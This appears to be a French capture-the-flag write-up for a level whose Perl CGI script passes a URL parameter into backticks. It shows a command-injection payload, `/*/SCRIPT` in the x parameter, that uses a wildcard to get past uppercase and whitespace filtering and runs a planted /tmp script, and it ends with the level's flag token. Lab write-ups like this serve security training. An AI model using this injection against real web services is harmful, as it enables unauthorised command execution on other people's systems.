On trouve dans le dossier home un file **level12.pl** qui contient:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
	$nn = $_[1];
	$xx = $_[0];
	$xx =~ tr/a-z/A-Z/;						# Met en majuscule
	$xx =~ s/\s.*//;						# Supprime tous les \s\t\r\n
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
	foreach $line (@output) {
		($f, $s) = split(/:/, $line);
		if($s =~ $nn) {
			return 1;
		}
	}
	return 0;
}

sub n {
	if($_[0] == 1) {
		print("..");
	} else {
		print(".");
	}
}
```
On remarque dans le code qu'il y a des "sécurités" par rapport au parametre **x**, ce dernier devant etre en majuscule et sans [\s\t\r\n].
On essaye donc de passer au travers de ces sécurités en créant un fichier dans /tmp en majuscule et en utilisant les wildcards.
On verifie les droits:

<pre><code>> echo "whoami > /tmp/test" > /tmp/SCRIPT
> chmod 777 /tmp/SCRIPT
</code></pre>
> Le chmod est important car on doit pouvoir executer /tmp/SCRIPT sans utiliser <code>sh</code>

Par la suite on va utilser la faille en allant sur :
<pre>http://192.168.1.42:4646/?x=`/*/SCRIPT`</pre>
> x prend en value /*/SCRIPT en injection, ce qui grâce a la wildcard nous donne /tmp/SCRIPT

> Faire un curl ici ne fonctionne pas, car les droits pris seront ceux de **level12**

<pre><code>> cat /tmp/test
flag12</code></pre>

Les droits sont bons donc on fait avec <code>getflag</code>
<pre><code>> echo "getflag > /tmp/test" > /tmp/SCRIPT
> chmod 777 /tmp/SCRIPT
</code></pre>
<pre>http://192.168.1.42:4646/?x=`/*/SCRIPT`</pre>
<pre><code>> cat /tmp/test
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr</code></pre>
